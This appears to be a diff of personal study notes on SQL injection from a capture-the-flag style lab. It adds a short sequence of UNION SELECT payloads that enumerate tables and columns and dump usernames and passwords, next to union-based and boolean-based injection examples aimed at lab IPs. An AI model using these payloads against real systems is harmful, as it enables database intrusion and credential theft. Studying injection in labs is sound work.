@@ -66,6 +66,14 @@ http://10.10.231.6/post?id=2 and 1=2 union select 1,2,concat(id,flag),4 from sqh
 concat(id,flag) means concatinate the id and flag(column_name) data together, example id=THM and flag={FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8} 
 Final=THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8} 
 
+SQL injection attack, listing the database contents on non-Oracle databases (postgres sql)
+----------------------------------------------------------------------------
+'+UNION+SELECT+'abc','def'--
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+______________________________________________________________________________________________________________________________________________________________________________________
+
 BOOLEAN BASED SQL INJECTION
 ----------------------------
 http://10.10.134.64/register/user-check?username=admin' (admin user is valid so it will return true value)
